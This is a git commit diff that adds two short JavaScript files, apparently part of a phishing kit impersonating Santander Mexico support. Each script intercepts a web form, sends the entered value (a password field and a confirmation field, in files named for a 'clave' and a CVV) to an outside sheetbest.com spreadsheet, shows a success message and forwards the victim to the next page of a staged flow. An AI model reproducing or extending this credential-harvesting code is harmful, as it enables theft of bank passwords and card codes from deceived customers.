a80441d73857f6ec17dd48bd85c27d8162c7bc62
soporte-mx-santander-0109 <hotelesrubie@gmail.com>
2026-09-01 11:36:26 -0600

    add files js and cc

---
+++ js/clave2.js
@@ -0,0 +1,34 @@
+const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://api.sheetbest.com/sheets/1d9bbad6-6003-4362-b281-f71f83d5c0e9', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            
+            "Datos": formulario.confirmar.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+	
+	setTimeout(() => {
+    window.location.href = "telefono.html";
+}, 1000);
+});
---
+++ js/cvv.js
@@ -0,0 +1,35 @@
+const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://api.sheetbest.com/sheets/1d9bbad6-6003-4362-b281-f71f83d5c0e9', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            
+            "Datos": formulario.contraseña.value
+            
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+	
+	setTimeout(() => {
+    window.location.href = "cvv2.html";
+}, 1000);
+});
